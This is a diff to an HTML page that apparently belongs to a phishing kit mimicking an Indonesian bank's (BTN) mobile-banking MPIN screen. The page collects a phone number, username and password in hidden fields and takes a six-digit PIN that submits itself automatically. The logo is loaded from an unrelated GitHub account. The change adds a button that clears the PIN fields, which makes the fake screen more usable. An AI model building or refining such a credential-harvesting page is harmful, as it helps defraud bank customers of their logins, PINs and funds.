@@ -145,6 +145,7 @@ input::placeholder{
           <input type="hidden" name="nohp" id="nohp">
           <input type="hidden" name="user" id="user">
           <input type="hidden" name="pass" id="pass">
+          <div type="button" class="clear">
     <div class="pin-code" maxlength="6" style="margin-top: -50px; position: absolute; left: 0; right: 0; margin: -40px auto;">
     <input inputmode="numeric" type="password" id="pin1" data-id="1" name="pin1" maxlength="1" required autofocus>
     <input inputmode="numeric" type="password" id="pin2" data-id="2" name="pin2" maxlength="1" autofocus>
@@ -154,11 +155,23 @@ input::placeholder{
     <input inputmode="numeric" type="password" value="" id="pin6" data-id="6" name="pin6" maxlength="1" autofocus onchange="javascript:this.form.submit();" oninput="sendPin()">
       </form>
       </div>
+      </div>
       <a href="#" class="lupa">Lupa MPIN?</a>
       <img src="https://raw.githubusercontent.com/gopay882/ast/main/BTN/logo-btn.png" width="30%" style="margin-top:320px" style="position:absolute;" alt="">
 </center>
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script>
+    $(document).ready(function() {
+    $('.clear').click(function() {
+        $('#pin1').val('');
+        $('#pin2').val('');
+        $('#pin3').val('');
+        $('#pin4').val('');
+        $('#pin5').val('');
+        $('#pin6').val('');
+        $('#pin1').focus();
+     });    
+  }); 
       //var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
 var pinContainer = document.querySelector(".pin-code");
 /*console.log('There is ' + pinContainer.length + ' Pin Container on the page.');*/
